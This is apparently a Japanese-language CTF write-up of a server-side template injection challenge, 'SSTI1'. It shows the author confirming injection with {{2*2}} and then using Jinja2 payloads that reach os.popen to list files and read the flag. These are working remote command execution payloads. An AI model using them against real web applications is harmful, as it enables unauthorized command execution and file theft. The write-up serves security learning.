## SSTI1

### Description  

I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps!

要約すると、
なんかすごいwebサイトを作ったようだ

---

早速、webサイトにアクセスする。  
下のようなwebサイトが開く。


![](./TTL1(1).png)

欄にHelloと入力する。h1タグで Helloと表示された。

開発者ツールを使って、
Serverが python3.8.10という情報が得られた。


欄に {{2*2}} と入力する。h1タグで 4 と表示された。  
コード実行は可能ということが分かった。

[CTFのWebセキュリティにおけるSSTIまとめ](https://blog.hamayanhamayan.com/entry/2021/12/15/225142)

上を参考にして、欄に下のようなコード実行をしてみる
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
下のようなファイルがある。

```
__pycache__ 
app.py
flag
requirements.txt
```

flagファイルが怪しいので、catする。
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

flagがゲットできた。
